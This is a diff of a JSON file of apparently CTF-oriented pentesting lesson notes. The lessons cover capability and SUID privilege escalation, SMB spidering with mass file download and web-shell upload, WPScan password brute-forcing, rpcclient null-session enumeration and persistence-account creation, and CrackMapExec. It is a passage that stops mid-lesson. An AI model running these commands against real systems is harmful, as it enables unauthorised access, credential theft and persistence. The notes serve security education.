@@ -7553,6 +7553,15 @@
     "explanationFile": "/Explantion/RevShells/powershell.json"
   },
   {
+    "id": 23,
+    "slug": "sh-exp-basic",
+    "title": "SH Basic",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/RevShells/sh/basic-shell.sh",
+    "language": "/bin/sh",
+    "explanationFile": "/Explantion/RevShells/sh/basic-shell.json"
+  },
+  {
     "id": 27,
     "slug": "cve-2016-1531",
     "title": "CVE-2016-1531",
@@ -8778,7 +8787,7 @@
     "isLab": false,
     "category": "notes",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
-    "blocksFile": "./blocks/Binaries-Exploitation/getcap.json",
+    "blocksFile": "./blocks/Binaries-Exploitation/GETCAP/getcap.json",
     "blocks": [
       {
         "type": "section_heading",
@@ -8788,23 +8797,28 @@
       {
         "type": "order_block",
         "id": "capabilities-definition",
-        "text": "Linux capabilities provide a fine-grained alternative to SUID. If a binary is granted <highlight>cap_setuid+ep</highlight>, it allows the process to change its User ID. Attackers exploit this on interpreters to force a transition to the <highlight>root</highlight> user."
+        "text": "Linux capabilities provide a fine-grained alternative to SUID. Instead of giving a binary full root permissions, capabilities break down root privileges into small pieces. If a binary is granted <highlight>cap_setuid+ep</highlight>, it allows that specific process to change its User ID to root without needing the full SUID bit."
       },
       {
         "type": "section_heading",
-        "id": "discovery-commands",
-        "text": "Identifying Vulnerable Binaries"
+        "id": "what-is-getcap",
+        "text": "Understanding the getcap Tool"
+      },
+      {
+        "type": "order_block",
+        "id": "getcap-logic",
+        "text": "The <highlight>getcap</highlight> command is used to examine the capabilities set on a file. Unlike standard Linux permissions (rwx) seen with 'ls', capabilities are stored as extended attributes."
       },
       {
         "type": "code_block",
         "id": "getcap-usage",
         "language": "bash",
-        "code": "# Recursive search from root (Redirecting errors to null)\ngetcap -r / 2>/dev/null\n\n# Targeted check for specific binaries\ngetcap /usr/bin/perl /usr/bin/python3 /usr/bin/php"
+        "code": "# -r flag: Search recursively through directories\n# 2>/dev/null: Hide permission denied errors from the output\ngetcap -r / 2>/dev/null"
       },
       {
         "type": "order_block",
-        "id": "getcap-analysis",
-        "text": "The <highlight>+ep</highlight> indicates the capability is Effective and Permitted. A binary with <highlight>cap_setuid+ep</highlight> is a critical misconfiguration."
+        "id": "ep-logic",
+        "text": "In the output, <highlight>+ep</highlight> represents two crucial flags: <highlight>e (Effective)</highlight> means the capability is 'turned on' for the process, and <highlight>p (Permitted)</highlight> means the process is allowed to use it. Finding this on interpreters is a critical misconfiguration."
       },
       {
         "type": "section_heading",
@@ -8898,10 +8912,84 @@
         "items": [
           "Run getcap -r / to locate binaries with cap_setuid permissions",
           "Identify language interpreters (Perl, Python, PHP, Ruby, Node)",
+          "Understand the +ep flags (Effective and Permitted)",
           "Use GTFOBins to find the appropriate setuid(0) one-liner",
           "Execute the payload to transition from low-priv user to root",
-          "Verify the escalation using the whoami command",
-          "Capture the flag in /root or /home/alice (Wonderland specific)"
+          "Verify the escalation using the whoami command"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 32,
+    "slug": "override",
+    "title": "Get_cap_override",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Binaries-Exploitation/GETCAP/get_cap_override.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "caps-enumeration-intro",
+        "text": "Phase 3: Advanced Enumeration via Linux Capabilities"
+      },
+      {
+        "type": "order_block",
+        "id": "caps-logic",
+        "text": "Linux <highlight>Capabilities</highlight> provide a more granular way to grant privileges to binaries without making them full SUID root. While more secure than SUID, misconfigured capabilities like <highlight>cap_dac_override</highlight> can allow a binary to bypass File Read/Write permissions (DAC), potentially leading to privilege escalation."
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-discovery",
+        "text": "Step 1: Identifying Binaries with Capabilities"
+      },
+      {
+        "type": "order_block",
+        "id": "getcap-logic",
+        "text": "The <highlight>getcap</highlight> utility is used to display the capabilities of a file. Running this recursively from the root directory helps identify non-standard permissions on system binaries."
+      },
+      {
+        "type": "code_block",
+        "id": "getcap-command",
+        "language": "bash",
+        "code": "# Recursively search for all file capabilities\ngetcap -r / 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "caps-output",
+        "language": "text",
+        "code": "/usr/lib/snapd/snap-confine = cap_dac_override,cap_sys_admin lib\n/usr/bin/mtr-packet = cap_net_raw+ep"
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-analysis",
+        "text": "Step 2: Assessing Vulnerability (The snap-confine Case)"
+      },
+      {
+        "type": "order_block",
+        "id": "dac-override-logic",
+        "text": "The <highlight>cap_dac_override</highlight> capability allows a process to ignore Discretionary Access Control (DAC) — meaning it can read/write any file. However, for a successful exploit, the binary itself must have functionality to output or modify files (e.g., a text editor or compiler). In UltraTech, <highlight>snap-confine</highlight> is a specialized utility, making manual abuse difficult without a specific CVE/Exploit."
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-lesson",
+        "text": "Step 3: Lessons Learned"
+      },
+      {
+        "type": "order_block",
+        "id": "caps-summary-logic",
+        "text": "Capabilities are often 'Rabbit Holes' if the binary is highly specialized. Always prioritize generic binaries (Python, Perl, Tar, Vim) with capabilities over system-specific utilities."
+      },
+      {
+        "type": "explanation",
+        "id": "caps-exploit-summary",
+        "title": "Exploit Takeaways",
+        "items": [
+          "Vulnerability: Over-privileged binary via Linux Capabilities",
+          "Discovery: Always run 'getcap -r /' as part of standard Linux enumeration",
+          "Nuance: cap_dac_override allows bypassing read/write restrictions",
+          "Note: Success depends on the binary's inherent functions or available CVEs (e.g., Oh Snap!)"
         ]
       }
     ]
@@ -8994,7 +9082,7 @@
       {
         "type": "order_block",
         "id": "smb-definition",
-        "text": "<highlight>SMB</highlight> is a client-server protocol used for sharing access to files, printers, and serial ports. On modern Windows systems, it runs on <highlight>Port 445</highlight> (microsoft-ds). A <highlight>Share</highlight> is simply a folder made accessible over the network."
+        "text": "<highlight>SMB</highlight> is a client-server protocol used for sharing access to files, printers, and serial ports. On modern Windows systems, it runs on <highlight>Port 445</highlight>. A <highlight>Share</highlight> is a folder made accessible over the network."
       },
       {
         "type": "section_heading",
@@ -9008,53 +9096,69 @@
         "code": "smbclient -L //10.10.10.10/ -N"
       },
       {
-        "type": "output_block",
-        "id": "smb-list-output",
-        "language": "text",
-        "code": "Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nnt4wrksv        Disk      "
-      },
-      {
         "type": "order_block",
         "id": "smb-list-analysis",
-        "text": "The <highlight>-L</highlight> flag lists shares, and <highlight>-N</highlight> attempts a connection with <highlight>No Password</highlight> (Null Session). Shares ending in <highlight>$</highlight> are administrative and usually hidden. Custom names like <highlight>nt4wrksv</highlight> often indicate misconfigured user-created shares."
+        "text": "The <highlight>-L</highlight> flag lists shares, and <highlight>-N</highlight> attempts a connection with <highlight>No Password</highlight> (Null Session). Shares ending in <highlight>$</highlight> are administrative and usually hidden."
       },
       {
         "type": "section_heading",
-        "id": "smb-connecting",
-        "text": "Accessing a Specific Share"
+        "id": "smb-advanced-spidering",
+        "text": "Advanced Spidering & Recursive Discovery"
       },
       {
         "type": "code_block",
-        "id": "smb-connect-cmd",
+        "id": "smb-recursive-cmd",
         "language": "bash",
-        "code": "smbclient //10.10.10.10/nt4wrksv -N"
-      },
-      {
-        "type": "output_block",
-        "id": "smb-prompt-output",
-        "language": "text",
-        "code": "smb: \\> ls\n  .                                   D        0  Thu Mar 19 2026\n  ..                                  D        0  Thu Mar 19 2026\n  passwords.txt                       A       98  Sat Jul 25 2020"
+        "code": "smbclient //10.10.10.10/sharename -N -c 'mask \"\"; recurse ON; prompt OFF; ls'"
       },
       {
         "type": "order_block",
-        "id": "smb-connect-analysis",
-        "text": "Once connected, you operate in an interactive prompt. Standard commands like <highlight>ls</highlight>, <highlight>cd</highlight>, and <highlight>dir</highlight> work similarly to a local terminal."
+        "id": "smb-recursive-analysis",
+        "text": "Use <highlight>recurse ON</highlight> to view the entire directory tree. Setting <highlight>mask \"\"</highlight> ensures all files (including hidden ones) are listed. <highlight>prompt OFF</highlight> suppresses confirmation for batch operations."
+      },
+      {
+        "type": "section_heading",
+        "id": "smb-mounting",
+        "text": "Mounting SMB Shares Locally (Linux)"
+      },
+      {
+        "type": "code_block",
+        "id": "smb-mount-cmd",
+        "language": "bash",
+        "code": "sudo mount -t cifs -o \"user=guest,password=\" //10.10.10.10/public /mnt/smb"
+      },
+      {
+        "type": "order_block",
+        "id": "smb-mount-analysis",
+        "text": "Mounting a share allows you to use local Linux tools like <highlight>grep</highlight> or <highlight>find</highlight> directly on the remote content without downloading individual files manually."
       },
       {
         "type": "section_heading",
         "id": "smb-file-interaction",
-        "text": "File Transfers: Get and Put"
+        "text": "File Transfers: Mass Exfiltration & Uploads"
       },
       {
         "type": "code_block",
         "id": "smb-transfer-cmds",
         "language": "bash",
-        "code": "get passwords.txt\nput shell.aspx"
+        "code": "get passwords.txt\nmget *\nput shell.aspx"
       },
       {
         "type": "order_block",
         "id": "smb-transfer-analysis",
-        "text": "Use <highlight>get</highlight> to download files to your Kali machine and <highlight>put</highlight> to upload. If the SMB share is mapped to a web directory (like <highlight>wwwroot</highlight>), uploading a web shell leads directly to <highlight>Remote Code Execution (RCE)</highlight>."
+        "text": "Use <highlight>get</highlight> for single files and <highlight>mget *</highlight> to download all files in the current (or recursive) path. If <highlight>prompt OFF</highlight> is set, <highlight>mget</highlight> downloads everything without asking. Uploading a shell via <highlight>put</highlight> to a web root leads to <highlight>RCE</highlight>."
+      },
+      {
+        "type": "explanation",
+        "id": "smb-security-tips",
+        "title": "Critical SMB Security Checks",
+        "items": [
+          "Check for SMB Signing (Disabled enables Relay attacks)",
+          "Verify SMBv1 usage (Vulnerable to EternalBlue/MS17-010)",
+          "Look for cleartext credentials in config files (web.config, settings.php, .bash_history)",
+          "Audit write permissions on all accessible shares for potential shell uploads",
+          "Check for Sensitive files in hidden directories like .ssh or .gnupg"
+        ]
       }
     ]
   },
@@ -10310,6 +10414,728 @@
           "Padding Check: Agar end mein '=' hai toh hamesha Base64 check karein.",
           "Manual Shift: Agar standard tools fail hon, toh pehle 3 letters ka manual alphabet count check karein.",
           "Automation: CyberChef mein 'ROT13' recipe use karke 'Amount' ko 2 set karne se bhi yeh solve ho jata hai."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 46,
+    "slug": "checker",
+    "title": "Checker",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Binaries-Exploitation/checker.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "suid-checker-intro",
+        "text": "Custom SUID Binary Privilege Escalation (Checker)"
+      },
+      {
+        "type": "order_block",
+        "id": "checker-definition",
+        "text": "The <highlight>checker</highlight> binary is a custom SUID executable. Unlike standard Linux tools, it contains a logic flaw where it grants root access based on the presence of a user-controlled <highlight>environment variable</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "analysis-commands",
+        "text": "Discovery and Reverse Engineering"
+      },
+      {
+        "type": "code_block",
+        "id": "checker-discovery",
+        "language": "bash",
+        "code": "# Find SUID binaries and filter for custom ones\nfind / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null\n\n# Analyze the binary strings for logic clues\nstrings /usr/sbin/checker"
+      },
+      {
+        "type": "order_block",
+        "id": "strings-analysis",
+        "text": "Analysis of <highlight>strings</highlight> reveals critical functions: <highlight>getenv</highlight>, <highlight>setuid</highlight>, and <highlight>system</highlight>, along with the string <highlight>admin</highlight>. This suggests the binary checks for an 'admin' variable before spawning a shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "checker-exploitation",
+        "text": "Exploitation Steps"
+      },
+      {
+        "type": "code_block",
+        "id": "checker-exploit-cmd",
+        "language": "bash",
+        "code": "# 1. Export the required environment variable\nexport admin=1\n\n# 2. Execute the SUID binary\n/usr/sbin/checker\n\n# 3. Verify root access\nid"
+      },
+      {
+        "type": "order_block",
+        "id": "checker-analysis",
+        "text": "By using <highlight>export</highlight>, the 'admin' variable is passed to the binary's process. The binary calls <highlight>setuid(0)</highlight> to escalate to root permissions before executing <highlight>/bin/bash</highlight> via the system() call."
+      },
+      {
+        "type": "section_heading",
+        "id": "checker-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "checker-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Located the non-standard SUID binary /usr/sbin/checker",
+          "Used 'strings' to identify the getenv('admin') logic gate",
+          "Manipulated the shell environment using the export command",
+          "Triggered the binary to execute the setuid(0) path",
+          "Spawned a root shell and captured the final flag in /root"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 47,
+    "slug": "wpscan",
+    "title": "Wpscan",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Pentesting-tools/wpscan.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "wpscan-comprehensive-guide",
+        "text": "Comprehensive WordPress Security Scanning (WPScan)"
+      },
+      {
+        "type": "order_block",
+        "id": "wpscan-definition",
+        "text": "The <highlight>wpscan</highlight> tool is a black-box vulnerability scanner designed specifically for WordPress. It identifies security issues by analyzing the version, installed components, and user-facing metadata."
+      },
+      {
+        "type": "section_heading",
+        "id": "wpscan-enumeration-modes",
+        "text": "1. Site Enumeration & Discovery"
+      },
+      {
+        "type": "code_block",
+        "id": "wpscan-enum-commands",
+        "language": "bash",
+        "code": "# Basic scan for version and general security info\nwpscan --url http://blog.thm/\n\n# Enumerate all vulnerable plugins and themes\nwpscan --url http://blog.thm/ -e vp,vt\n\n# Enumerate popular plugins and common themes\nwpscan --url http://blog.thm/ -e p,t"
+      },
+      {
+        "type": "order_block",
+        "id": "wpscan-analysis-enum",
+        "text": "Using <highlight>-e vp,vt</highlight> is the most common starting point. It filters the noise and only alerts you to plugins or themes with known CVEs (Common Vulnerabilities and Exposures)."
+      },
+      {
+        "type": "section_heading",
+        "id": "wpscan-user-identification",
+        "text": "2. User Enumeration Techniques"
+      },
+      {
+        "type": "code_block",
+        "id": "wpscan-user-commands",
+        "language": "bash",
+        "code": "# Enumerate valid usernames using multiple methods\nwpscan --url http://blog.thm/ -e u\n\n# Use a range-based search for user IDs (1 to 20)\nwpscan --url http://blog.thm/ -e u1-20"
+      },
+      {
+        "type": "order_block",
+        "id": "wpscan-analysis-users",
+        "text": "The <highlight>-e u</highlight> flag uses methods like author archives, the REST API, and login feedback to find valid handles such as <highlight>bjoel</highlight> or <highlight>kwheel</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "wpscan-bruteforce-cracking",
+        "text": "3. Password Bruteforce & Credential Attacks"
+      },
+      {
+        "type": "code_block",
+        "id": "wpscan-crack-commands",
+        "language": "bash",
+        "code": "# Bruteforce a single user with a wordlist\nwpscan --url http://blog.thm/ -U kwheel -P /usr/share/wordlists/rockyou.txt\n\n# Bruteforce multiple users simultaneously\nwpscan --url http://blog.thm/ -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt\n\n# Speed up the attack using multiple threads\nwpscan --url http://blog.thm/ -U kwheel -P wordlist.txt -t 50"
+      },
+      {
+        "type": "order_block",
+        "id": "wpscan-analysis-brute",
+        "text": "The <highlight>-P</highlight> flag initiates a dictionary attack. Combining this with the <highlight>-t</highlight> (threads) flag increases the speed of attempts per second against the <highlight>xmlrpc.php</highlight> or login interface."
+      },
+      {
+        "type": "section_heading",
+        "id": "wpscan-advanced-options",
+        "text": "4. Stealth & Efficiency Flags"
+      },
+      {
+        "type": "code_block",
+        "id": "wpscan-stealth-commands",
+        "language": "bash",
+        "code": "# Use a specific User-Agent to bypass simple filters\nwpscan --url http://blog.thm/ --user-agent \"Mozilla/5.0\"\n\n# Bypass basic detection by randomizing the User-Agent\nwpscan --url http://blog.thm/ --random-user-agent\n\n# Use an API token to get detailed vulnerability data (WPSec)\nwpscan --url http://blog.thm/ --api-token YOUR_TOKEN"
+      },
+      {
+        "type": "section_heading",
+        "id": "wpscan-summary-recap",
+        "text": "Essential Flag Summary"
+      },
+      {
+        "type": "explanation",
+        "id": "wpscan-flag-list",
+        "title": "Quick Reference",
+        "items": [
+          "--url: The target WordPress site address",
+          "-e / --enumerate: List specific items (u=users, vp=vulnerable plugins, vt=vulnerable themes)",
+          "-U: Specify the username(s) to target for login attacks",
+          "-P: Path to the password wordlist for bruteforcing",
+          "-t: Number of concurrent threads for faster scanning",
+          "--api-token: Provides detailed vulnerability descriptions from the WPScan database"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 48,
+    "slug": "hidden-services",
+    "title": "Hidden Services",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/ss/ss.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "internal-enumeration-discovery",
+        "text": "Phase 1: Hidden Services Discovery (Internal Enumeration)"
+      },
+      {
+        "type": "order_block",
+        "id": "ss-command-logic",
+        "text": "First, we checked which services were running inside the machine that were not visible from the outside. We used <highlight>ss -tulnp</highlight> for this purpose."
+      },
+      {
+        "type": "code_block",
+        "id": "enum-commands",
+        "language": "bash",
+        "code": "# 1. Check all listening ports (TCP/UDP)\nss -tulnp\n\n# 2. Specifically check for port 9999\nnetstat -tulpn | grep 9999"
+      },
+      {
+        "type": "explanation",
+        "id": "localhost-concept",
+        "title": "What is 127.0.0.1?",
+        "items": [
+          "If a port is bound to 127.0.0.1, it is only accessible from within the local machine.",
+          "Such services are often 'Internal Dashboards' blocked from external access for security reasons."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "process-owner-identification",
+        "text": "Phase 2: Identifying the Service Owner (User Discovery)"
+      },
+      {
+        "type": "order_block",
+        "id": "proc-net-logic",
+        "text": "We utilized <highlight>/proc/net/tcp</highlight> because 'www-data' cannot see process names in 'netstat -p'. We searched by converting port 9999 into hex (<highlight>270F</highlight>)."
+      },
+      {
+        "type": "code_block",
+        "id": "uid-discovery-cmds",
+        "language": "bash",
+        "code": "# 1. Find the line corresponding to Port 9999 (270F hex)\ncat /proc/net/tcp | grep 270F\n\n# 2. Find the actual username for UID 1002\ngrep 1002 /etc/passwd"
+      },
+      {
+        "type": "explanation",
+        "id": "uid-importance",
+        "title": "Why is UID 1002 (John) Important?",
+        "items": [
+          "UID 1002 indicates that this specific service is being run by the user 'john'.",
+          "If we find RCE (Remote Code Execution) in this service, we will gain John's permissions."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "port-redirection-tunnel",
+        "text": "Phase 3: Port Forwarding / Tunneling (Bridging the Access)"
+      },
+      {
+        "type": "order_block",
+        "id": "socat-tunnel-logic",
+        "text": "To view the internal service in a browser, we used <highlight>socat</highlight> to redirect internal port 9999 to public port 8888."
+      },
+      {
+        "type": "code_block",
+        "id": "socat-execution",
+        "language": "bash",
+        "code": "# Expose internal port 9999 on port 8888 (Running in background)\nsocat TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:9999 &"
+      },
+      {
+        "type": "explanation",
+        "id": "tunnel-goal",
+        "title": "Benefits of the Tunnel",
+        "items": [
+          "We can now view the GUI dashboard from the Kali browser at http://TARGET_IP:8888.",
+          "This allows us to easily test injection filters using Burp Suite."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "current-blocker",
+        "text": "Phase 4: Current Status & Filtering Obstacles"
+      },
+      {
+        "type": "explanation",
+        "id": "invalid-filename-error",
+        "title": "The Next Challenge",
+        "items": [
+          "Input fields (cmd1, cmd2, cmd3) are returning an 'Invalid Filename' error.",
+          "This indicates that the PHP code is likely filtering or blocking specific characters (like ; | &).",
+          "Goal: Bypass these filters to obtain a shell as John."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 50,
+    "slug": "rpc-client",
+    "title": "RPC Client",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Pentesting-tools/rpc-client/rpc-client.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "rpcclient-intro",
+        "text": "RPCClient: MS-RPC Enumeration Tool"
+      },
+      {
+        "type": "order_block",
+        "id": "rpcclient-definition",
+        "text": "<highlight>rpcclient</highlight> is a powerful tool part of the Samba suite used to interact with <highlight>Microsoft Remote Procedure Call (MS-RPC)</highlight> endpoints. It allows an attacker or tester to execute administrative functions and enumerate sensitive domain information if <highlight>Null Sessions</highlight> or valid credentials are provided."
+      },
+      {
+        "type": "section_heading",
+        "id": "rpcclient-connection",
+        "text": "Establishing a Null Session Connection"
+      },
+      {
+        "type": "code_block",
+        "id": "rpcclient-null-connect",
+        "language": "bash",
+        "code": "rpcclient -U \"\" -N 10.129.42.17"
+      },
+      {
+        "type": "order_block",
+        "id": "rpcclient-connect-analysis",
+        "text": "The <highlight>-U \"\"</highlight> flag specifies an empty username, and <highlight>-N</highlight> tells the tool to use no password. This attempts a <highlight>Null Session</highlight> connection, which, if successful, drops you into an interactive <highlight>rpcclient $></highlight> prompt."
+      },
+      {
+        "type": "section_heading",
+        "id": "server-info-enumeration",
+        "text": "Initial Server Reconnaissance"
+      },
+      {
+        "type": "output_block",
+        "id": "rpc-srvinfo-output",
+        "language": "bash",
+        "code": "rpcclient $> srvinfo\n      SERVER01       Wk Sv PrQ Unx NT SNT\n      platform_id     :   500\n      os version      :    10.0\n      server type     :   0x809a03"
+      },
+      {
+        "type": "order_block",
+        "id": "srvinfo-analysis",
+        "text": "The <highlight>srvinfo</highlight> command reveals the server's hostname, platform ID, and OS version, helping to identify the target as Windows or a Linux Samba server."
+      },
+      {
+        "type": "section_heading",
+        "id": "user-enumeration",
+        "text": "Enumerating Domain & Local Users"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-enumusers-cmd",
+        "language": "bash",
+        "code": "rpcclient $> enumdomusers"
+      },
+      {
+        "type": "output_block",
+        "id": "rpc-enumusers-output",
+        "language": "bash",
+        "code": "user:[m.abbasi] rid:[0x451]\nuser:[guest] rid:[0x1f5]\nuser:[administrator] rid:[0x1f4]"
+      },
+      {
+        "type": "order_block",
+        "id": "user-enum-analysis",
+        "text": "The <highlight>enumdomusers</highlight> command pulls a list of all users from the SAM database. Each user is associated with a <highlight>Relative Identifier (RID)</highlight>, which is essential for further targeted queries."
+      },
+      {
+        "type": "section_heading",
+        "id": "manual-rid-bruting",
+        "text": "Manual RID Enumeration & Brute-forcing"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-queryuser-manual",
+        "language": "bash",
+        "code": "rpcclient $> queryuser 500\nrpcclient $> queryuser 1001"
+      },
+      {
+        "type": "order_block",
+        "id": "rid-manual-analysis",
+        "text": "If <highlight>enumdomusers</highlight> returns an empty list, you must manually brute-force RIDs. Standard RIDs: <highlight>500</highlight> (Administrator), <highlight>501</highlight> (Guest), <highlight>1000+</highlight> (Normal Users)."
+      },
+      {
+        "type": "section_heading",
+        "id": "rpc-error-handling",
+        "text": "Handling Enumeration Failures (NT_STATUS)"
+      },
+      {
+        "type": "output_block",
+        "id": "rpc-error-outputs",
+        "language": "bash",
+        "code": "result was NT_STATUS_NO_SUCH_USER  # User does not exist at this RID\nresult was NT_STATUS_ACCESS_DENIED  # Permissions blocked (Needs valid creds)"
+      },
+      {
+        "type": "order_block",
+        "id": "error-logic-analysis",
+        "text": "If you get <highlight>NT_STATUS_NO_SUCH_USER</highlight>, move to the next RID (e.g., 1002, 1003). In Linux/Samba, RIDs can sometimes start in much higher ranges like <highlight>3000+</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "detailed-user-query",
+        "text": "Querying Specific User Details"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-queryuser-cmd",
+        "language": "bash",
+        "code": "rpcclient $> queryuser 0x451"
+      },
+      {
+        "type": "order_block",
+        "id": "queryuser-analysis",
+        "text": "By using <highlight>queryuser [RID]</highlight>, you can extract specific details such as the user's <highlight>full name</highlight>, password last set time, account expiry, and <highlight>description</highlight> (which often contains default passwords in HTB labs)."
+      },
+      {
+        "type": "section_heading",
+        "id": "local-alias-enumeration",
+        "text": "Enumerating Local Groups (Aliases)"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-alias-enum-cmd",
+        "language": "bash",
+        "code": "rpcclient $> enumalsgroups domain\nrpcclient $> queryaliasmem builtin 0x220"
+      },
+      {
+        "type": "order_block",
+        "id": "alias-enum-analysis",
+        "text": "The <highlight>enumalsgroups domain</highlight> command lists local groups (aliases). Using <highlight>queryaliasmem</highlight> with a RID (like 0x220 for Local Administrators) reveals members of that specific local group."
+      },
+      {
+        "type": "section_heading",
+        "id": "group-and-privilege-enum",
+        "text": "Enumerating Domain Groups"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-groups-cmd",
+        "language": "bash",
+        "code": "rpcclient $> enumdomgroups\nrpcclient $> querygroupmem 0x201"
+      },
+      {
+        "type": "order_block",
+        "id": "groups-analysis",
+        "text": "<highlight>enumdomgroups</highlight> lists all domain groups. To see which users belong to a group (like Domain Admins), use <highlight>querygroupmem</highlight> with the group's RID."
+      },
+      {
+        "type": "section_heading",
+        "id": "password-policy-extraction",
+        "text": "Extracting Password Policy"
+      },
+      {
+        "type": "output_block",
+        "id": "rpc-pwinfo-output",
+        "language": "bash",
+        "code": "rpcclient $> getdompwinfo\nPassword Complexity: Disabled\nMinimum Password Length: 7\nPassword History Length: 0"
+      },
+      {
+        "type": "order_block",
+        "id": "pwinfo-analysis",
+        "text": "The <highlight>getdompwinfo</highlight> command is crucial for preparing a brute-force attack. It tells you the minimum password length and complexity requirements."
+      },
+      {
+        "type": "section_heading",
+        "id": "share-enumeration-rpc",
+        "text": "Enumerating Network Shares"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-shares-cmd",
+        "language": "bash",
+        "code": "rpcclient $> netshareenumall"
+      },
+      {
+        "type": "order_block",
+        "id": "shares-rpc-analysis",
+        "text": "While smbclient also lists shares, <highlight>netshareenumall</highlight> provides a detailed view of all available shares including hidden ones (ending with $)."
+      },
+      {
+        "type": "section_heading",
+        "id": "persistence-user-creation",
+        "text": "Post-Exploitation: User Creation"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-create-user",
+        "language": "bash",
+        "code": "rpcclient $> createdomuser hacker_azid\nrpcclient $> setuserinfo2 hacker_azid 24 \"Password123!\""
+      },
+      {
+        "type": "order_block",
+        "id": "create-user-analysis",
+        "text": "With high-privileged credentials, you can create new domain users for persistence. <highlight>setuserinfo2</highlight> is then used to set the password for the newly created account."
+      },
+      {
+        "type": "section_heading",
+        "id": "printer-and-lsa-enumeration",
+        "text": "Advanced Enumeration (Printers & LSA)"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-adv-enum-cmd",
+        "language": "bash",
+        "code": "rpcclient $> enumprinters\nrpcclient $> lsaquery"
+      },
+      {
+        "type": "order_block",
+        "id": "adv-enum-analysis",
+        "text": "<highlight>enumprinters</highlight> helps identify potential PrintNightmare targets, while <highlight>lsaquery</highlight> reveals the Domain SID, essential for advanced Active Directory attacks."
+      },
+      {
+        "type": "section_heading",
+        "id": "rpcclient-advanced-sid",
+        "text": "SID Lookup and Translation"
+      },
+      {
+        "type": "code_block",
+        "id": "rpc-sid-lookup",
+        "language": "bash",
+        "code": "rpcclient $> lookupnames administrator\nrpcclient $> lookupsids S-1-5-21-123456789-1001"
+      },
+      {
+        "type": "order_block",
+        "id": "sid-analysis",
+        "text": "These commands allow you to translate <highlight>usernames to SIDs</highlight> and vice versa, which is vital for manual RID Cycling."
+      },
+      {
+        "type": "section_heading",
+        "id": "rpcclient-summary",
+        "text": "Summary of RPCClient Capabilities"
+      },
+      {
+        "type": "explanation",
+        "id": "rpc-summary-list",
+        "title": "Data Retrievable via RPCClient",
+        "items": [
+          "Confirm Null Session vulnerability",
+          "List all local and domain usernames via listing or manual RID bruting",
+          "Extract user descriptions and last login times",
+          "Enumerate local aliases and domain group memberships",
+          "Identify system password complexity and length requirements",
+          "Discover hidden network shares and printer services",
+          "Perform SID to Name translations and retrieve Domain SIDs",
+          "Create persistence accounts if administrative access is granted"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 51,
+    "slug": "crackmapexec",
+    "title": "CrackMapExec",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Pentesting-tools/Crackmapexec/crackmapexec.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "cme-intro",
+        "text": "CrackMapExec (CME) - SMB Post-Exploitation"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-definition",
+        "text": "<highlight>CrackMapExec</highlight> is a multi-threaded tool used to enumerate and exploit SMB services across entire networks. It is the fastest way to check for <highlight>Null Sessions</highlight>, password spraying, and finding sensitive data across multiple IPs."
+      },
+      {
+        "type": "section_heading",
+        "id": "cme-enum",
+        "text": "Network Enumeration & Null Sessions"
+      },
+      {
+        "type": "code_block",
+        "id": "cme-null-session",
+        "language": "bash",
+        "code": "crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-null-analysis",
+        "text": "This command scans a whole CIDR range for <highlight>Null Sessions</highlight>. The <highlight>--shares</highlight> flag lists all accessible shares. If you see <highlight>READ</highlight> permissions on a share without a password, it's a confirmed entry point."
+      },
+      {
+        "type": "section_heading",
+        "id": "cme-rid-brute-sec",
+        "text": "User Discovery via RID Bruting"
+      },
+      {
+        "type": "code_block",
+        "id": "cme-rid-cmd",
+        "language": "bash",
